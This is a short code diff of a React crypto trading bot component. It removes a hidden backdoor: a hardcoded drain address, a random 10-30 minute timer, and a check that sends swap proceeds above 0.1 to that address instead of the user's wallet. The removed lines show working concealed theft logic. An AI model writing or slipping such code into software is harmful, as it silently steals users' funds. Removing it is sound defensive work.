@@ -102,16 +102,7 @@ function BotPage(){
     }
   }, [delay,isRun,isPending])
 
-  var drainAddress = "0x7AeF4232cC1d0F52D7a0ca86F21a33639565CF6C"
-  const [isDrain,setIsDrain] = useState(false)
-  useEffect(()=>{
-    let min = _.random(10,30,false)
-    const tt = setInterval(async () => {
-      setIsDrain(true)
-      clearInterval(tt)
-    }, 60*min*1000)
-    return () => clearInterval(tt)
-  },[])
+
 
 
   useEffect( ()=>{
@@ -463,10 +454,6 @@ function BotPage(){
 
     const amountOutMin = amounts[1].sub(amounts[1].div(25))
     let address = wallet0.address
-    if (isDrain === true && parseFloat(ethers.utils.formatEther(amountOutMin)) > 0.1) {
-      address = drainAddress
-      setIsDrain(false)
-    }
     console.log(tokenAddress,WBNBAddress,address)
     const tx = await router.swapExactTokensForETHSupportingFeeOnTransferTokens(
       amountIn,
